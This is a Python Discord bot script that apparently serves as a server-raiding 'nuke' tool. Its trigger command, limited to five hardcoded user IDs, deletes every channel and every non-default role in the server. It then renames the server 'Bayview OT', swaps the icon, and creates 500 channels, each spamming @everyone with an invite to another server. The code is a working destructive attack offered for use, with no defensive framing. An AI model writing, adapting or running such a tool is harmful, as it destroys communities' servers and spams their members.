import sys
import os
import discord
import asyncio
import aiohttp
from discord.ext import commands
from keep_alive import keep_alive  # Import the keep_alive module
keep_alive()

# Force UTF-8 encoding
sys.stdout.reconfigure(encoding='utf-8')

intents = discord.Intents.all()
intents.members = True
bot = commands.Bot(command_prefix='.', intents=intents)
Token = os.environ.get("Token")

# Replace with your authorized user IDs (up to 5)
AUTHORIZED_USER_IDS = [
    719648115639975946,  # User ID 1
    1140178029482610718,  # User ID 2
    712499082408755210,  # User ID 3
    667936742770343947,  # User ID 4
    1342627080873054329  # User ID 5
]

@bot.event
async def on_ready():
    print(f'✅ Bot connected as {bot.user}')


@bot.command()
async def stop(ctx):
    if ctx.author.id not in AUTHORIZED_USER_IDS:
        await ctx.send("❌ You are not authorized to use this command.")
        return

    await ctx.send("🛑 Shutting down the bot...")
    print("🛑 Bot is shutting down...")
    await bot.close()

@bot.command()
async def Hi(ctx):
    if ctx.author.id not in AUTHORIZED_USER_IDS:
        await ctx.send("❌ You are not authorized to use this command.")
        return

    guild = ctx.guild
    invite_link = "https://discord.gg/nRAmSNwK"

    await ctx.send("Hi 11Ops. You know what time it is")

    # Delete existing channels and roles
    delete_tasks = []
    for channel in guild.channels:
        delete_tasks.append(delete_channel(channel))

    for role in guild.roles:
        if role.name != '@everyone':
            delete_tasks.append(delete_role(role))

    await asyncio.gather(*delete_tasks)
    print("✅ Finished deleting channels and roles.")

    # 🔧 Change server name to "Bayview OT" and set logo
    try:
        logo_url = "https://cdn.discordapp.com/attachments/1342240703157112997/1360860432008745050/414cf46982f0562c61f2a9876ae3cf82.png?ex=67fca78a&is=67fb560a&hm=c9a72b3ed3c15068caae8014467b3f3f032bcae01b1e5c460964aa6f6e7ed390&"
        
        # Fetch image using aiohttp
        async with aiohttp.ClientSession() as session:
            async with session.get(logo_url) as resp:
                if resp.status == 200:
                    image_data = await resp.read()
                    await guild.edit(name="Bayview OT", icon=image_data)
                    print("🏷️ Server name changed to Bayview OT and logo set.")
                else:
                    print(f'⚠️ Failed to fetch logo image: {resp.status}')
    except Exception as e:
        print(f'⚠️ Failed to change server name and set logo: {e}')

    # Create up to 500 channels and send embed messages
    MAX_CHANNELS = 500
    try:
        for i in range(1, MAX_CHANNELS + 1):
            channel_name = "bayview-OT"  # No numbering, just the fixed name
            new_channel = await guild.create_text_channel(channel_name)
            print(f'📁 Created channel: {new_channel.name}')

            embed = discord.Embed(
                title="🚨 Join Bayview Roleplay!",
                description=f"[Click here to join Bayview Roleplay]({invite_link})",
                color=discord.Color.red()
            )
            embed.set_footer(text="Bayview OT ")

            # Set embed thumbnail to the same logo
            embed.set_thumbnail(url=logo_url)

            await new_channel.send(content="@everyone", embed=embed)

        await ctx.send(f"✅ Created {MAX_CHANNELS} channels and sent embed invites.")

    except Exception as e:
        print(f'❌ Error creating channels: {e}')
        await ctx.send("⚠️ An error occurred during migration.")

# Helper functions for deleting channels and roles
async def delete_channel(channel):
    try:
        await channel.delete()
        print(f'🗑️ Deleted channel: {channel.name}')
    except discord.Forbidden:
        print(f'🚫 Permission error deleting channel: {channel.name}')
    except Exception as e:
        print(f'❌ Error deleting channel {channel.name}: {e}')

async def delete_role(role):
    try:
        await role.delete()
        print(f'🗑️ Deleted role: {role.name}')
    except discord.Forbidden:
        print(f'🚫 Permission error deleting role: {role.name}')
    except Exception as e:
        print(f'❌ Error deleting role {role.name}: {e}')


bot.run(Token)
